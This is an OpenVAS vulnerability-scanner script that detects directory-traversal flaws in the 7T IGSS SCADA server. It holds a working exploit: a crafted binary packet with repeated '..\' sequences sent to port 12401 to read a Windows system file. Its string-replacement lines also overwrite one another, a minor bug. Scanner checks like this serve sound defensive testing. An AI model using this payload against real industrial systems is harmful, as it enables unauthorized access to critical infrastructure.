###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_igss_46936.nasl 12098 2018-10-25 13:07:45Z cfischer $
#
# 7T Interactive Graphical SCADA System Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Update By:
# Veerendra G.G <veerendragg@secpod.com> on 2011-05-18
# Updated CVE and Reference section with exploit-db id.
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103128");
  script_version("$Revision: 12098 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-25 15:07:45 +0200 (Thu, 25 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-03-28 13:42:17 +0200 (Mon, 28 Mar 2011)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2011-1565", "CVE-2011-1567");
  script_bugtraq_id(46936);
  script_name("7T Interactive Graphical SCADA System Multiple Security Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("General");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "os_detection.nasl");
  script_require_ports(12401);
  script_mandatory_keys("Host/runs_windows");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/46936");
  script_xref(name:"URL", value:"http://www.igss.com/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/517080");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17300/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17024/");
  script_xref(name:"URL", value:"http://aluigi.org/adv/igss_1-adv.txt");
  script_xref(name:"URL", value:"http://aluigi.org/adv/igss_2-adv.txt");
  script_xref(name:"URL", value:"http://aluigi.org/adv/igss_3-adv.txt");
  script_xref(name:"URL", value:"http://aluigi.org/adv/igss_4-adv.txt");
  script_xref(name:"URL", value:"http://aluigi.org/adv/igss_5-adv.txt");
  script_xref(name:"URL", value:"http://aluigi.org/adv/igss_6-adv.txt");
  script_xref(name:"URL", value:"http://aluigi.org/adv/igss_7-adv.txt");
  script_xref(name:"URL", value:"http://aluigi.org/adv/igss_8-adv.txt");

  script_tag(name:"summary", value:"7T Interactive Graphical SCADA System is prone to multiple security
  vulnerabilities.");

  script_tag(name:"impact", value:"Exploiting these issues may allow remote attackers to execute arbitrary
  code within the context of the affected application or perform unauthorized actions using directory traversal strings.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this
  vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable
  respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");

port = 12401;
if( ! get_port_state( port ) )
  exit( 0 );

soc = open_sock_tcp( port );
if( ! soc )
  exit( 0 );

files = traversal_files( "Windows" );

foreach pattern( keys( files ) ) {

  ex = raw_string( 0x9b, 0x00, 0x01, 0x00, 0x34, 0x12, 0x0d, 0x00,
                   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
                   0x00, 0x00, 0x03, 0x00, 0x00, 0x00 );
  ex += crap( data:raw_string( 0x2e, 0x2e, 0x5c), length:48 );

  file = files[pattern];
  # nb: Workaround as egrep is not matching the response due to non printable characters in the response
  pattern = str_replace( find:"\[", string:file, replace:"[" );
  pattern = str_replace( find:"\]", string:file, replace:"]" );
  pattern = str_replace( find:"supporT", string:file, replace:"support" );

  ex += string( file );
  ex += crap( data:raw_string( 0x00 ), length:77 );

  send( socket:soc, data:ex );
  res = recv( socket:soc, length:8072 );

  if( pattern >< res ) {
    close( soc );
    security_message( port:port );
    exit( 0 );
  }
}

close( soc );
exit( 0 );